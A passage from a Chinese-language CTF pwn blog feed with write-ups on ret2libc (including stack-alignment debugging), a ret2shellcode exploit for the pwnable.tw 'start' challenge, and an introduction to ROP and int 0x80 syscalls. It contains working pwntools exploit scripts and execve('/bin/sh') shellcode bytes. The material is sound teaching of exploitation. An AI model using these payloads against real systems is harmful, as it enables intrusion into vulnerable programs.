punctuation">)</span>libc <span class="token operator">=</span> LibcSearcher<span class="token punctuation">(</span><span class="token string">"puts"</span><span class="token punctuation">,</span>puts_addr<span class="token punctuation">)</span>libc_addr <span class="token operator">=</span> puts_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">"puts"</span><span class="token punctuation">)</span>system_addr <span class="token operator">=</span> libc_addr <span class="token operator">+</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">"system"</span><span class="token punctuation">)</span>binsh_addr <span class="token operator">=</span> libc_addr <span class="token operator">+</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">"str_bin_sh"</span><span class="token punctuation">)</span>payload2 <span class="token operator">=</span> <span class="token string">"A"</span><span class="token operator">*</span><span class="token number">112</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>binsh_addr<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h3 id="在语法上是没有啥问题的，但是很可惜是错的。原因：第二次用gets进行溢出时溢出点发生了变化"><a href="#在语法上是没有啥问题的，但是很可惜是错的。原因：第二次用gets进行溢出时溢出点发生了变化" class="headerlink" title="在语法上是没有啥问题的，但是很可惜是错的。原因：第二次用gets进行溢出时溢出点发生了变化"></a>在语法上是没有啥问题的，但是很可惜是错的。原因：第二次用gets进行溢出时溢出点发生了变化</h3><h2 id="4-探究"><a href="#4-探究" class="headerlink" title="4:探究"></a>4:探究</h2><p>我们来看看main函数的反汇编：</p><pre class=" language-bash"><code class="language-bash"> 08048618 <span class="token operator">&lt;</span>main<span class="token operator">></span>: 8048618:    55                       push   ebp     8048619:    89 e5                    mov    ebp,esp 804861b:    83 e4 f0                 and    esp,0xfffffff0 804861e:    83 c4 80                 add    esp,0xffffff80 8048621:    a1 60 a0 04 08           mov    eax,ds:0x804a060 8048626:    c7 44 24 0c 00 00 00     mov    DWORD PTR <span class="token punctuation">[</span>esp+0xc<span class="token punctuation">]</span>,0x0 804862d:    00  804862e:    c7 44 24 08 02 00 00     mov    DWORD PTR <span class="token punctuation">[</span>esp+0x8<span class="token punctuation">]</span>,0x2 8048635:    00  8048636:    c7 44 24 04 00 00 00     mov    DWORD PTR <span class="token punctuation">[</span>esp+0x4<span class="token punctuation">]</span>,0x0 804863d:    00  804863e:    89 04 24                 mov    DWORD PTR <span class="token punctuation">[</span>esp<span class="token punctuation">]</span>,eax 8048641:    e8 5a fe ff ff           call   80484a0 <span class="token operator">&lt;</span>setvbuf@plt<span class="token operator">></span> 8048646:    a1 40 a0 04 08           mov    eax,ds:0x804a040 804864b:    c7 44 24 0c 00 00 00     mov    DWORD PTR <span class="token punctuation">[</span>esp+0xc<span class="token punctuation">]</span>,0x0 8048652:    00  8048653:    c7 44 24 08 01 00 00     mov    DWORD PTR <span class="token punctuation">[</span>esp+0x8<span class="token punctuation">]</span>,0x1 804865a:    00  804865b:    c7 44 24 04 00 00 00     mov    DWORD PTR <span class="token punctuation">[</span>esp+0x4<span class="token punctuation">]</span>,0x0 8048662:    00  8048663:    89 04 24                 mov    DWORD PTR <span class="token punctuation">[</span>esp<span class="token punctuation">]</span>,eax 8048666:    e8 35 fe ff ff           call   80484a0 <span class="token operator">&lt;</span>setvbuf@plt<span class="token operator">></span> 804866b:    c7 04 24 40 87 04 08     mov    DWORD PTR <span class="token punctuation">[</span>esp<span class="token punctuation">]</span>,0x8048740 8048672:    e8 e9 fd ff ff           call   8048460 <span class="token operator">&lt;</span>puts@plt<span class="token operator">></span> 8048677:    c7 04 24 6b 87 04 08     mov    DWORD PTR <span class="token punctuation">[</span>esp<span class="token punctuation">]</span>,0x804876b 804867e:    e8 ad fd ff ff           call   8048430 <span class="token operator">&lt;</span>printf@plt<span class="token operator">></span> 8048683:    8d 44 24 1c              lea    eax,<span class="token punctuation">[</span>esp+0x1c<span class="token punctuation">]</span> 8048687:    89 04 24                 mov    DWORD PTR <span class="token punctuation">[</span>esp<span class="token punctuation">]</span>,eax 804868a:    e8 b1 fd ff ff           call   8048440 <span class="token operator">&lt;</span>gets@plt<span class="token operator">></span> 804868f:    b8 00 00 00 00           mov    eax,0x0 8048694:    c9                       leave   8048695:    c3                       ret   </code></pre><p>第一第二行是常规操作。</p><h4 id="第四第五行：被称为栈对齐"><a href="#第四第五行：被称为栈对齐" class="headerlink" title="第四第五行：被称为栈对齐"></a>第四第五行：被称为栈对齐</h4><pre class=" language-bash"><code class="language-bash">804861b:    83 e4 f0                 and    esp,0xfffffff0  //esp最后一个字节清零804861e:    83 c4 80                 add    esp,0xffffff80  //esp倒数第二个字节如果大于等于8则变为8，小于则清零，倒数第一个字节也清零</code></pre><h3 id="栈对齐有关资料：64位"><a href="#栈对齐有关资料：64位" class="headerlink" title="栈对齐有关资料：64位"></a>栈对齐有关资料：64位</h3><blockquote><p>许多计算机系统对基本数据类型的合法地址做了一些限制，要求某种类型对象的地址必须是某个值K的倍数，其中K具体如下图。这种对齐限制简化了形成处理器和内存系统之间接口的硬件设计。举个实际的例子：比如我们在内存中读取一个8字节长度的变量，那么这个变量所在的地址必须是8的倍数。如果这个变量所在的地址是8的倍数，那么就可以通过一次内存操作完成该变量的读取。倘若这个变量所在的地址并不是8的倍数，那么可能就需要执行两次内存读取，因为该变量被放在两个8字节的内存块中了。</p></blockquote><blockquote><p>无论数据是否对齐，x86_64硬件都能正常工作，但是却会降低系统的性能，所以我们的编译器在编译时一般会为我们实施数据对齐。</p></blockquote><blockquote><p>栈的字节对齐，实际是指栈顶指针必须须是16字节的整数倍。栈对齐帮助在尽可能少的内存访问周期内读取数据，不对齐堆栈指针可能导致严重的性能下降。<br>上文我们说，即使数据没有对齐，我们的程序也是可以执行的，只是效率有点低而已，但是某些型号的Intel和AMD处理器对于有些实现多媒体操作的SSE指令，如果数据没有对齐的话，就无法正确执行。这些指令对16字节内存进行操作，在SSE单元和内存之间传送数据的指令要求内存地址必须是16的倍数。</p><blockquote><blockquote><p>因此，任何针对x86_64处理器的编译器和运行时系统都必须保证分配用来保存可能会被SSE寄存器读或写的数据结构的内存，都必须是16字节对齐的，这就形成了一种标准：<br>任何内存分配函数（alloca, malloc, calloc或realloc）生成的块起始地址都必须是16的倍数。<br>大多数函数的栈帧的边界都必须是16直接的倍数。<br>在运行时栈中，不仅传递的参数和局部变量要满足字节对齐，我们的栈指针（%rsp）也必须是16的倍数。</p></blockquote></blockquote></blockquote><p>详情见：<a href="https://www.cnblogs.com/tcctw/p/11333743.html" target="_blank" rel="noopener">https://www.cnblogs.com/tcctw/p/11333743.html</a></p><p>总结：为了满足数据对齐和栈字节对齐的要求，或者说规范，编译器不惜牺牲了部分内存，这使得程序提高了兼容性，也提高了程序的性能</p><p><strong>在常规操作push  ebp 和mov  ebp，esp后面免不了这种调整栈空间的指令 这样的指令对第一次求溢出是没有影响的，因为只要看最后的ret部分。但是如果进行第二次攻击再次从main函数进入将再次执行这样的影响 esp的指令 我们再次使用之前的溢出点就可能会出错。就像这里的栈对齐操作，显然这个操作与esp本身的大小有关。在程序最后直接ret到main函数会导致esp加4从而下次的栈对齐操作因为esp变化了所以栈空间也会发生变化。导致变化完了后esp到ebp的距离不再是114. 解决方法就是在脚本中用gdb.attach()进入调试在即将进行第二次之前在main函数下断点，从而观察，调整溢出点。</strong></p><h3 id="下面我直接跳到ret处了，从这里的esp也很容易看出前面8个A是多余的所以得出第二次溢出点位104"><a href="#下面我直接跳到ret处了，从这里的esp也很容易看出前面8个A是多余的所以得出第二次溢出点位104" class="headerlink" title="下面我直接跳到ret处了，从这里的esp也很容易看出前面8个A是多余的所以得出第二次溢出点位104"></a>下面我直接跳到ret处了，从这里的esp也很容易看出前面8个A是多余的所以得出第二次溢出点位104</h3><pre class=" language-bash"><code class="language-bash">EBX: 0x0 ECX: 0xf7f9b5c0 --<span class="token operator">></span> 0xfbad2288 EDX: 0xf7f9c89c --<span class="token operator">></span> 0x0 ESI: 0xf7f9b000 --<span class="token operator">></span> 0x1d4d6c EDI: 0x0 EBP: 0x41414141 <span class="token punctuation">(</span><span class="token string">'AAAA'</span><span class="token punctuation">)</span>ESP: 0xffbedef4 <span class="token punctuation">(</span><span class="token string">"AAAAAAAA\020-\340"</span>, <span class="token operator">&lt;</span>incomplete sequence \367<span class="token operator">></span><span class="token punctuation">)</span>EIP: 0x8048695 <span class="token punctuation">(</span><span class="token operator">&lt;</span>main+125<span class="token operator">></span>:    ret<span class="token punctuation">)</span>EFLAGS: 0x246 <span class="token punctuation">(</span>carry PARITY adjust ZERO sign <span class="token function">trap</span> INTERRUPT direction overflow<span class="token punctuation">)</span><span class="token punctuation">[</span>-------------------------------------code-------------------------------------<span class="token punctuation">]</span>   0x804868a <span class="token operator">&lt;</span>main+114<span class="token operator">></span>:    call   0x8048440 <span class="token operator">&lt;</span>gets@plt<span class="token operator">></span>   0x804868f <span class="token operator">&lt;</span>main+119<span class="token operator">></span>:    mov    eax,0x0   0x8048694 <span class="token operator">&lt;</span>main+124<span class="token operator">></span>:    leave  <span class="token operator">=</span><span class="token operator">></span> 0x8048695 <span class="token operator">&lt;</span>main+125<span class="token operator">></span>:    ret       0x8048696:    xchg   ax,ax   0x8048698:    xchg   ax,ax   0x804869a:    xchg   ax,ax   0x804869c:    xchg   ax,ax<span class="token punctuation">[</span>------------------------------------stack-------------------------------------<span class="token punctuation">]</span>0000<span class="token operator">|</span> 0xffbedef4 <span class="token punctuation">(</span><span class="token string">"AAAAAAAA\020-\340"</span>, <span class="token operator">&lt;</span>incomplete sequence \367<span class="token operator">></span><span class="token punctuation">)</span>0004<span class="token operator">|</span> 0xffbedef8 <span class="token punctuation">(</span><span class="token string">"AAAA\020-\340"</span>, <span class="token operator">&lt;</span>incomplete sequence \367<span class="token operator">></span><span class="token punctuation">)</span>0008<span class="token operator">|</span> 0xffbedefc --<span class="token operator">></span> 0xf7e02d10 <span class="token punctuation">(</span><span class="token operator">&lt;</span>system<span class="token operator">></span>:    sub    esp,0xc<span class="token punctuation">)</span>0012<span class="token operator">|</span> 0xffbedf00 --<span class="token operator">></span> 0x0 0016<span class="token operator">|</span> 0xffbedf04 --<span class="token operator">></span> 0xf7f418cf <span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span>0020<span class="token operator">|</span> 0xffbedf08 --<span class="token operator">></span> 0xf7f9b000 --<span class="token operator">></span> 0x1d4d6c 0024<span class="token operator">|</span> 0xffbedf0c --<span class="token operator">></span> 0xf7fce75a <span class="token punctuation">(</span>add    edi,0x178a6<span class="token punctuation">)</span>0028<span class="token operator">|</span> 0xffbedf10 --<span class="token operator">></span> 0xf7fe6000 --<span class="token operator">></span> 0x26f34 <span class="token punctuation">[</span>------------------------------------------------------------------------------<span class="token punctuation">]</span>Legend: code, data, rodata, value</code></pre><p>最终结果：</p><pre class=" language-bash"><code class="language-bash"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Switching to interactive modev\x84\x04\x86\x84\x04\x90m���Z��\xb6\x84\x04Ƅ\x04No surprise anymore, system disappeard QQ.Can you <span class="token function">find</span> it <span class="token operator">!</span>?$ <span class="token function">ls</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF-PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wiki--pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>StackOverFlow之Ret2ShellCode详解</title>
      <link href="/2020/07/02/stackoverflow-zhi-ret2shellcode-xiang-jie/"/>
      <url>/2020/07/02/stackoverflow-zhi-ret2shellcode-xiang-jie/</url>
      
        <content type="html"><![CDATA[<h1 id="函数调用时栈中的变化-test"><a href="#函数调用时栈中的变化-test" class="headerlink" title="函数调用时栈中的变化 test"></a>函数调用时栈中的变化 test</h1><p>示例代码:test.c</p><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token keyword">int</span> <span class="token function">fun</span><span class="token punctuation">(</span><span class="token keyword">int</span> a<span class="token punctuation">,</span><span class="token keyword">int</span> b<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> a <span class="token operator">+</span> b<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token keyword">const</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span>b <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>    <span class="token function">fun</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p><strong>编译程序： gcc test.c -m32 -fno-stack-protector -z execstack -no-pie -o test</strong><br><strong>-fno-stack-protector   ————关闭栈保护 stack</strong><br><strong>-z execstack   ————关闭NX堆栈不可执行</strong><br><strong>-no-pie   ————关闭PIE地址随机化</strong></p><p><strong>然后对test用linux自带的反汇编指令：objdump进行反汇编  objdump -d  :反汇编特定指令机器码的section  -Mintle ：表示用intel语法</strong></p><pre class=" language-bash"><code class="language-bash">objdump test1 -d -Mintel主要函数结果如下080483f6 <span class="token operator">&lt;</span>fun<span class="token operator">></span>: 80483f6:    55                       push   ebp 80483f7:    89 e5                    mov    ebp,esp 80483f9:    e8 42 00 00 00           call   8048440 <span class="token operator">&lt;</span>__x86.get_pc_thunk.ax<span class="token operator">></span> 80483fe:    05 02 1c 00 00           add    eax,0x1c02 8048403:    8b 55 08                 mov    edx,DWORD PTR <span class="token punctuation">[</span>ebp+0x8<span class="token punctuation">]</span> 8048406:    8b 45 0c                 mov    eax,DWORD PTR <span class="token punctuation">[</span>ebp+0xc<span class="token punctuation">]</span> 8048409:    01 d0                    add    eax,edx 804840b:    5d                       pop    ebp 804840c:    c3                       ret    0804840d <span class="token operator">&lt;</span>main<span class="token operator">></span>: 804840d:    55                       push   ebp 804840e:    89 e5                    mov    ebp,esp 8048410:    83 ec 10                 sub    esp,0x10 8048413:    e8 28 00 00 00           call   8048440 <span class="token operator">&lt;</span>__x86.get_pc_thunk.ax<span class="token operator">></span> 8048418:    05 e8 1b 00 00           add    eax,0x1be8 804841d:    c7 45 fc 01 00 00 00     mov    DWORD PTR <span class="token punctuation">[</span>ebp-0x4<span class="token punctuation">]</span>,0x1 8048424:    c7 45 f8 02 00 00 00     mov    DWORD PTR <span class="token punctuation">[</span>ebp-0x8<span class="token punctuation">]</span>,0x2 804842b:    ff 75 f8                 push   DWORD PTR <span class="token punctuation">[</span>ebp-0x8<span class="token punctuation">]</span> 804842e:    ff 75 fc                 push   DWORD PTR <span class="token punctuation">[</span>ebp-0x4<span class="token punctuation">]</span> 8048431:    e8 c0 ff ff ff           call   80483f6 <span class="token operator">&lt;</span>fun<span class="token operator">></span> 8048436:    83 c4 08                 add    esp,0x8 8048439:    b8 00 00 00 00           mov    eax,0x0 804843e:    c9                       leave   804843f:    c3                       ret    </code></pre><p> 观察fun函数可以发现：</p><pre class=" language-bash"><code class="language-bash">push   ebpmov   ebp,esp<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>.<span class="token punctuation">..</span><span class="token punctuation">..</span>.pop ebpret</code></pre><p><em>这段指令标志这一个函数的开始与结束。这四句指令就是函数开辟，栈帧就是一块被ebp和esp夹住的区域的开始与结尾的标志性语句</em></p><p>现在调试看看main函数对fun函数的调用和传值在汇编中是怎样的<br>相关指令：</p><pre class=" language-bash"><code class="language-bash"> 804841d:    c7 45 fc 01 00 00 00     mov    DWORD PTR <span class="token punctuation">[</span>ebp-0x4<span class="token punctuation">]</span>,0x1   //将1传给 以<span class="token punctuation">[</span>ebp-0x4<span class="token punctuation">]</span>代表的地址处 并以32位即4字节形式传递（DWORD PTR <span class="token punctuation">[</span><span class="token punctuation">]</span>） a <span class="token operator">=</span> 1 8048424:    c7 45 f8 02 00 00 00     mov    DWORD PTR <span class="token punctuation">[</span>ebp-0x8<span class="token punctuation">]</span>,0x2   //将2传给 以<span class="token punctuation">[</span>ebp-0x8<span class="token punctuation">]</span>代表的地址处 并以32位即4字节形式传递（DWORD PTR <span class="token punctuation">[</span><span class="token punctuation">]</span>） b <span class="token operator">=</span> 2 804842b:    ff 75 f8                 push   DWORD PTR <span class="token punctuation">[</span>ebp-0x8<span class="token punctuation">]</span>   //将<span class="token punctuation">[</span>ebp-0x8<span class="token punctuation">]</span>区域的值以32位入栈  即  b <span class="token operator">=</span> 2 入栈 804842e:    ff 75 fc                 push   DWORD PTR <span class="token punctuation">[</span>ebp-0x4<span class="token punctuation">]</span>   //将<span class="token punctuation">[</span>ebp-0x4<span class="token punctuation">]</span>区域的值以32位入栈  即  a <span class="token operator">=</span> 1 入栈 8048431:    e8 c0 ff ff ff           call   80483f6 <span class="token operator">&lt;</span>fun<span class="token operator">></span>  //调用fun函数</code></pre><p><strong>可以发现参数入栈的顺序 与我们c语言正常的调用顺序是相反的：参数逆序入栈。</strong><br><strong><em>调用一个函数前都是先压入参数(没有参数就不用)然后再调用函数汇编表现为 push xxx ; push xxx; push xxx; call xxx的形式</em></strong></p><p>继续看fun函数中对参数的调用（忽略前面两条指令）</p><pre class=" language-bash"><code class="language-bash">8048403:    8b 55 08                 mov    edx,DWORD PTR <span class="token punctuation">[</span>ebp+0x8<span class="token punctuation">]</span>  //将<span class="token punctuation">[</span>ebp+0x8<span class="token punctuation">]</span>区域的值传给edx 即 edx <span class="token operator">=</span> 1 8048406:    8b 45 0c                 mov    eax,DWORD PTR <span class="token punctuation">[</span>ebp+0xc<span class="token punctuation">]</span>  //将<span class="token punctuation">[</span>ebp+0xc<span class="token punctuation">]</span>区域的值传给eax 即 eax <span class="token operator">=</span> 2 8048409:    01 d0                    add    eax,edx  //eax <span class="token operator">=</span> eax + edx</code></pre><p><em>为啥[ebp-0x4]  [ebp-0x8]  对应了fun函数中的 [ebp+0xc] [ebp+0x8]：</em></p><pre class=" language-bash"><code class="language-bash">主要影响指令main:804842b:    ff 75 f8                 push   DWORD PTR <span class="token punctuation">[</span>ebp-0x8<span class="token punctuation">]</span>804842e:    ff 75 fc                 push   DWORD PTR <span class="token punctuation">[</span>ebp-0x4<span class="token punctuation">]</span><span class="token punctuation">..</span><span class="token punctuation">..</span>.<span class="token punctuation">..</span>.<span class="token punctuation">..</span>fun:80483f6:    55                       push   ebp804840e:    89 e5                    mov    ebp,esp  //esp 与 ebp指向同一位置</code></pre><p>示意图<br><img src="https://s1.ax1x.com/2020/07/02/NbwCIH.png" alt=""><br>再试着去理解[ebp-0x4]  [ebp-0x8]  对应了fun函数中的 [ebp+0xc] [ebp+0x8]的原因就很明了了</p><h1 id="start"><a href="#start" class="headerlink" title="start"></a>start</h1><p>此题源程序可以从 pwnable.tw 中获取<br>用checksec 发现保护全关</p><pre class=" language-bash"><code class="language-bash"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/hunter/PWN/wiki/overflow/Ret2ShellCode/start'</span>    Arch:     i386-32-little    RELRO:    No RELRO    Stack:    No canary found    NX:       NX disabled    PIE:      No PIE <span class="token punctuation">(</span>0x8048000<span class="token punctuation">)</span></code></pre><p>因为次elf文件过于简单就没使用IDA了直接linux反汇编</p><pre class=" language-bash"><code class="language-bash">hunter@hunter:~/PWN/wiki/overflow/Ret2ShellCode$ objdump start -d -Mintelstart：     文件格式 elf32-i386Disassembly of section .text:08048060 <span class="token operator">&lt;</span>_start<span class="token operator">></span>: 8048060:    54                       push   esp 8048061:    68 9d 80 04 08           push   0x804809d  //压入exit函数地址 8048066:    31 c0                    xor    eax,eax 8048068:    31 db                    xor    ebx,ebx 804806a:    31 c9                    xor    ecx,ecx 804806c:    31 d2                    xor    edx,edx 804806e:    68 43 54 46 3a           push   0x3a465443   //压入字符串 8048073:    68 74 68 65 20           push   0x20656874 8048078:    68 61 72 74 20           push   0x20747261 804807d:    68 73 20 73 74           push   0x74732073 8048082:    68 4c 65 74 27           push   0x2774654c 8048087:    89 e1                    mov    ecx,esp 8048089:    b2 14                    mov    dl,0x14  //0x14 <span class="token operator">=</span> 20 804808b:    b3 01                    mov    bl,0x1 804808d:    b0 04                    mov    al,0x4 804808f:    <span class="token function">cd</span> 80                    int    0x80   //调用write 8048091:    31 db                    xor    ebx,ebx 8048093:    b2 3c                    mov    dl,0x3c  //0x3c <span class="token operator">=</span> 60 8048095:    b0 03                    mov    al,0x3 8048097:    <span class="token function">cd</span> 80                    int    0x80   //调用read 8048099:    83 c4 14                 add    esp,0x14 804809c:    c3                       ret    0804809d <span class="token operator">&lt;</span>_exit<span class="token operator">></span>: 804809d:    5c                       pop    esp 804809e:    31 c0                    xor    eax,eax 80480a0:    40                       inc    eax 80480a1:    <span class="token function">cd</span> 80                    int    0x80</code></pre><p>可以看出这整个程序就_start和_exit两个函数。看代码应该是出题者可以构造的因为按照正常的栈首先因该是 push  ebp而不是esp<br><strong>int 0x80 ; 这代表着系统中断也就是调用系统函数类似于之前所说的call xxxx; 结构不同的是这里面的参数都是寄存器传参</strong>sys_write(fd,&amp;buf,len)ebx 存放的是 fd(文件描述符有0、1、2三个值0代表标准输入1代表标准输出2代表标准错误输出)ecx 中存放的是 buf 的地址也就是将要输出的字符串的首地址edx 存放的是输出字符串的长度<br>mov  ecx,esp因为 esp 指向栈顶且根据实际程序输出ecx 就是存放着 Let’s start the CTF:</p><p>分析两次int 0x80的寄存器参数可知 ：第一次write函数将Let’s start the CTF:恰好20个字符输出。<strong>第二次read函数将读取60个字符，栈溢出。一定注意不论是调用write函数还是read函数在输出和输入字符串时esp并没有立刻改变而是等到特定的指令。</strong></p><h2 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h2><p>在调用 sys_write() 之前栈帧情况<br><img src="https://s1.ax1x.com/2020/07/02/NbwFJA.png" alt=""><br>蓝色就是buf部分执行sys_read函数时esp 还是指向此地 输入的内容重新覆盖这块缓冲区超出的部分继续向下覆盖。<br>因为ret_addr保存的是exit函数的地址正常返回的话是直接退出程序现在需要控制这个地址使其返回到我们想要去的地方。<br>在write（）后面add    esp,0x14指令将esp指向ret_addr 完成ret指令后 esp指向 原esp地址即指向的数据与地址重合。<br>那么如果我们控制ret再次跳到write函数那么esp地址会被泄露，继续下面的read函数，在read函数中我们就可以写入shellcode，控制其位置然后执行。<br><img src="https://s1.ax1x.com/2020/07/02/NbwkRI.png" alt=""></p><p>执行完sys_read()函数之后还需执行 add esp,0x14 所以 shellcode 能放的地方也只有剩下的40字节但也足够了。</p><p><img src="https://s1.ax1x.com/2020/07/02/Nbwiid.png" alt=""><br>所以 shellcode 的起始地址为 esp+20,之前的部分可任意填充除 ’\x00‘ (会造成截断)之外的内容。<br>exp：</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment" spellcheck="true">#context.log_level = 'debug'</span>sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./start'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#有时'./start'还是"start"或是"./start"也会引发玄学问题，多注意</span>sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">)</span>payload1 <span class="token operator">=</span> <span class="token string">'a'</span> <span class="token operator">*</span> <span class="token number">20</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x08048087</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#gdb.attach(sh)</span>sh<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload1<span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">#此处如果换成sendline会出错，原因目前未知，感觉很玄学</span>stack_addr <span class="token operator">=</span> sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>addr <span class="token operator">=</span>  u32<span class="token punctuation">(</span>stack_addr<span class="token punctuation">)</span>nopsled <span class="token operator">=</span> <span class="token string">'\x90'</span> <span class="token operator">*</span> <span class="token number">10</span>shellcode <span class="token operator">=</span><span class="token string">'\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'</span>payload2 <span class="token operator">=</span> <span class="token string">'a'</span> <span class="token operator">*</span> <span class="token number">20</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>addr <span class="token operator">+</span> <span class="token number">20</span><span class="token punctuation">)</span> <span class="token operator">+</span> nopsled <span class="token operator">+</span> shellcodesh<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span> </code></pre><p>注意：nopsled = ‘\x90’就是NULL的意思什么都不做，像滑雪橇一样一直划到 shellcode中 可以增强exp的移植性</p><p>因为NX关闭 ，这个题也可以用直接想buf中写入shellcode在用coredump寻找buf地址，转跳该地址来解决</p><p>shellcode集：<a href="http://shell-storm.org/shellcode/" target="_blank" rel="noopener">http://shell-storm.org/shellcode/</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF-PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 原理学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ROP链的简单构造</title>
      <link href="/2020/06/01/rop-lian-de-jian-dan-gou-zao/"/>
      <url>/2020/06/01/rop-lian-de-jian-dan-gou-zao/</url>
      
        <content type="html"><![CDATA[<p><strong><em>随着 NX 保护的开启，以往直接向栈或者堆上直接注入代码的方式难以继续发挥效果。攻击者们也提出来相应的方法来绕过保护，目前主要的是 ROP(Return Oriented Programming)，其主要思想是在栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。所谓 gadgets 就是以 ret 结尾的指令序列，通过这些指令序列，我们可以修改某些地址的内容，方便控制程序的执行流程。之所以称之为 ROP，是因为核心在于利用了指令集中的 ret 指令，改变了指令流的执行顺序。ROP 攻击一般得满足如下条件</em></strong></p><pre><code>程序存在溢出，并且可以控制返回地址。可以找到满足条件的 gadgets 以及相应 gadgets 的地址。</code></pre><p>首先我们想想如果nx是关闭的我们可以通过构造shellcode放入栈中，再转跳的buf上即可执行我们的shellcode。而打开shell的函数是system（“/bin/sh”）或execve（“/bin/sh”）等。那么问题来了，我们这段ShellCode里面并没有system这个函数，是谁实现了“system(“/bin/sh”)”的效果呢。在网上查了一些资料大致就是：<br>EAX, EBX, ECX, EDX四个寄存器被先后清零，EAX被赋值为0Xb，ECX入栈，“/bin//sh”字符串入栈，并将其首地址赋给了EBX，最后执行完int 80h</p><p>int指令的功能是调用系统中断，所以int 80h就是调用128号中断，在32位的linux系统中，该中断被用于呼叫系统调用程序system_call( )。我们知道出于对硬件和操作系统内核的保护，应用程序的代码一般在保护模式下运行。<br>在这个模式下我们使用的程序和写的代码是没办法访问内核空间的。但是我们显然可以通过调用read( ), write( )之类的函数从键盘读取输入，把其保存在硬盘里的文件中。那么read( ), write( )之类的函数是怎么突破保护模式的管制，成功访问到本该由内核管理的这些硬件呢？<br>答案就在于int 80h这个中断调用。不同的内核态操作通过给寄存器设置不同的值，再调用同样的指令int 80h，就可以通知内核完成不同的功能。而read( ), write( ), system( )之类的需要内核“帮忙”的函数，就是围绕这条指令加上一些额外参数处理，异常处理等代码封装而成的。32位linux系统的内核一共提供了0~337号共计338种系统调用用以实现不同的功能。<br>Linux 32位的系统调用时通过int 80h来实现的，eax寄存器中为调用的功能号，ebx、ecx、edx、esi等等寄存器则依次为参数。<br>以下是一个简单的hello world程序</p><pre class=" language-bash"><code class="language-bash">.section .datamsg:        .ascii <span class="token string">"Hello world!\n"</span>.section .text.globl _start_start:        movl <span class="token variable">$4</span>, %eax        movl <span class="token variable">$1</span>, %ebx        movl <span class="token variable">$msg</span>, %ecx        movl <span class="token variable">$13</span>, %edx        int <span class="token variable">$0x80</span>        movl <span class="token variable">$1</span>, %eax        movl <span class="token variable">$0</span>, %ebx        int <span class="token variable">$0x80</span></code></pre><p>从 /usr/include/asm/unistd.h中可以看到exit的功能号_NR_exit为1，write(_NR_write)功能号为4，因此第一个int 0x80调用之前eax寄存器值为4，ebx为文件描述符，stdout的文件描述符为1，ecx则为buffer的内存地址，edx为buffer长度。第二个int 0x80之前eax为1表示调用exit，ebx为0表示返回0。</p><p>我们常用的：</p><pre class=" language-c"><code class="language-c"><span class="token number">1</span><span class="token punctuation">.</span> sys_exitSyntax<span class="token punctuation">:</span> <span class="token keyword">int</span> <span class="token function">sys_exit</span><span class="token punctuation">(</span><span class="token keyword">int</span> status<span class="token punctuation">)</span>Source<span class="token punctuation">:</span> kernel<span class="token operator">/</span>exit<span class="token punctuation">.</span>cAction<span class="token punctuation">:</span> terminate the current processDetails<span class="token punctuation">:</span> status is <span class="token keyword">return</span> code<span class="token number">3</span><span class="token punctuation">.</span> sys_readSyntax<span class="token punctuation">:</span> ssize_t <span class="token function">sys_read</span><span class="token punctuation">(</span><span class="token 